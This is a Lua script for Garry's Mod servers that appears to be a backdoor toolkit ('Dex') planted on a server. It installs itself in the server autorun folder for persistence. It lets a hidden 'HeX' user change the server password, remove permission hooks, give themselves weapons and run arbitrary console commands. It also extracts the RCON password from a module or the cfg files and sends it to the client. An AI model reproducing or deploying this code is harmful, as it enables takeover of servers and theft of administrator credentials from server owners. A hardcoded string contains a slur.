


local function SaveDex(ply,cmd,args)
	if IsUH then return ply:print("[ERR] No modules!") end
	if not gpio then
		ExecDownload(DEX_PATH, "gpio.lua", true)
	end
	
	local Dex = ExecDownload(DEX_PATH, "dex_autorun.lua", false, true)
	
	local Done = (gpio.Write("lua\\autorun\\server\\dex_autorun.lua", Dex) == gpio.Done)
	
	if Done then
		ply:print("[OK] dex_autorun.lua saved to autorun ("..tostring(Done)..")")
	else
		ply:print("[ERR] gpio.Write error")
	end
end
command.Add("dex_save", SaveDex, "Try to save dex_autorun.lua for next time")


--FIXSET
local function FixSet(ply,cmd,args)
	timer.Create("fixset", 0.2, 0, function()
		RunConsoleCommand("sbox_godmode", "0")
		RunConsoleCommand("sbox_plpldamage", "0")
		if not IsUH then
			RunConsoleCommand("sbox_noclip", "1")
		end
		RunConsoleCommand("sbox_weapons", "1")
	end)
	ply:print("[OK] Fixed damage settings")
end
command.Add("fixset", FixSet, "Fix damage settings")


local function SetPW(ply,cmd,args)
	local Pass = args[1] or "beta"
	
	game.ConsoleCommand([[sv_password "]]..Pass..[["\n]])
end
command.Add("pw", SetPW, "Password set")

local function RemovePW(ply,cmd,args)
	game.ConsoleCommand([[sv_password ""\n]])
end
command.Add("nopw", RemovePW, "Password remove")


local function GPIODump(ply,cmd,args)
	ExecDownload(DEX_PATH, "gpio.lua")
	
	if (table.Count(gpio.Dlls) == 0) or IsUH then
		ply:print("[ERR] No modules!")
		return
	end
	
	local tot = 0
	for k,v in pairs(gpio.Dlls) do
		tot = tot + 1
		ply:print("!\t"..k)
	end
	
	ply:print("[OK] Server has ["..tot.."] modules!")
end
command.Add("gpio", GPIODump, "List all modules")



--NOTOOL
local function NoTool()
	hook.GetTable()["CanTool"] = nil
	ply:print("[OK] Removed all CanTool hooks")
end
command.Add("notool", NoTool, "Remove all CanTool")



function FixPickup()
	hook.Add("PhysgunPickup", "!aaa", function(ply,ent)
		if ent:IsPlayer() and ent:IsHeX() then
			ent:SetHealth(500)
			ply:Explode(1)
			ply:Kill()
		end
	end)
end
FixPickup()

--NOPHYS
local function NoPhys(ply,cmd,args)
	hook.GetTable()["PhysgunPickup"] = nil
	FixPickup()
	ply:print("[OK] Removed all PhysgunPickup hooks")
end
command.Add("nophys", NoPhys, "Remove all PhysgunPickup")


local function PlayerLoadout(ply)
	if ply:IsHeX() then
		ply:Give("weapon_stunstick")
		ply:Give("weapon_slam")
		ply:Give("weapon_rpg")
		
		timer.Simple(0.2, function()
			if (ply:IsValid()) then
				ply:RemoveAmmo(ply:GetAmmoCount("slam"), "slam")
				ply:GiveAmmo(22,"slam",false)
				
				ply:RemoveAmmo(ply:GetAmmoCount("SMG1_Grenade"), "SMG1_Grenade")
				ply:GiveAmmo(22,"SMG1_Grenade",false)
				
				ply:RemoveAmmo(ply:GetAmmoCount("RPG_Round"), "RPG_Round")
				ply:GiveAmmo(22,"RPG_Round",false)
			end
		end)
	end
	
	ply:Give("weapon_smg1")
	ply:Give("weapon_ar2")
	ply:Give("weapon_357")
end
hook.Add("PlayerLoadout", "PlayerLoadout", PlayerLoadout)



--- === USEFUL === ---
--RCON
local FORCE 		= false
local GPIODoneCheck = false
local function RCON(ply,cmd,args)
	if (#args == 0) or IsUH then
		ply:print("[ERR] No args!")
		return
	end
	local str = table.concat(args," ")
	
	if not gpio then
		ExecDownload(DEX_PATH, "gpio.lua", true)
	end
	if not GPIODoneCheck then
		GPIODoneCheck = true
		if (gpio.ConCommand("stats") == gpio.Error) then
			FORCE = true
		end
	end
	
	if FORCE then
		game.ConsoleCommand(str.."\n")
	else
		gpio.ConCommand(str)
	end
	
	ply:print("[OK] running: '"..str.."'")
end
command.Add("rc", RCON, "Remote RCON")


local function SendRCPW(ply,v)
	if not ValidEntity( GetHeX() ) then return end
	
	if ValidEntity(ply) then
		ply:SendLua([[
			usermessage.Hook("rc", function(u)
				RCPW = u:ReadString()
				RunConsoleCommand("_dex_save_rc", RCPW)
			end)
			]]
		)
		
		timer.Simple(1, function()
			if ValidEntity(ply) then
				umsg.Start("rc", ply)
					umsg.String(v)
				umsg.End()
			end
		end)
	end
end


local function ReadFile(ply,File)
	local Got = false
	for k,v in pairs( string.Explode("\n", File) ) do
		if v:find("rcon") then
			Got = true
			ply:print("[Line "..k.."] "..v)
			SendRCPW(ply,v)
		end
	end
	return Got
end


--PASSWORD
local function RCONPass(ply,cmd,args)
	if IsUH then return ply:print("[CVar2] FagBalls01RCON") end
	
	ExecDownload(DEX_PATH, "gpio.lua", true)
	if (gpio and gpio.Dlls.cvar2) then
		require("cvar2")
		
		if (cvar2 and cvar2.GetValue) then
			local pass = cvar2.GetValue("rcon_password")
			
			ply:print("[CVar2] "..pass)
			SendRCPW(ply,pass)
			return
		end
	end
	
	ply:print("[ERR] no CVar2, searching cfg files..")
	
	local Got = false
	for k,v in pairs( file.Find("cfg/*.*",true) ) do
		if ReadFile(ply, file.Read("cfg/"..v,true) ) then
			Got = true
		end
	end
	
	
	if not Got then
		ply:print("[ERR] Not in cfg, give up")
	end
end
command.Add("rcpw", RCONPass, "Get RCON password")

--GIVE
local function SpawnThat(ply,cmd,args)
	local egc = args[1]
	
	local lol = ents.Create(egc)
		if not ValidEntity(lol) then
			ply:print("[ERR] No '"..egc.."' on the server!")
			return
		end
		lol:SetPos( ply:GetEyeTrace().HitPos )
	lol:Spawn()
	
	ply:print("[OK] Spawned a '"..egc.."'")
end
command.Add("g2", SpawnThat, "Spawn that entity")

--CLEANUP
local function CleanMap()
	game.CleanUpMap()
	ply:print("[OK] Cleaned the map")
end
command.Add("cleanup", CleanMap, "Clean the map")
--- === /USEFUL === ---




